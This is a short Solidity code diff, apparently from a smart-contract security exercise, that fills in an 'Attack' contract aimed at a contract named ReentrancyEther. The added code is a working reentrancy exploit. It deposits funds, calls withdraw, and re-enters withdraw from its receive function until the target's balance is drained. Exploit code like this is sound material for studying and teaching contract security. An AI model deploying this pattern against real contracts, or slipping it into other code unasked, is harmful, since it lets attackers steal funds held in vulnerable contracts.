@@ -37,4 +37,23 @@ contract ReentrancyEther {
     }
 }
 
-contract Attack {}
+contract Attack {
+    ReentrancyEther immutable i_target;
+
+    constructor(address target) {
+        i_target = ReentrancyEther(target);
+    }
+
+    receive() external payable {
+        if (address(i_target).balance > 0) {
+            i_target.withdraw();
+        }
+    }
+
+    function deposit() public payable {}
+
+    function attack(uint amount) public {
+        i_target.deposit{value: amount}();
+        i_target.withdraw();
+    }
+}
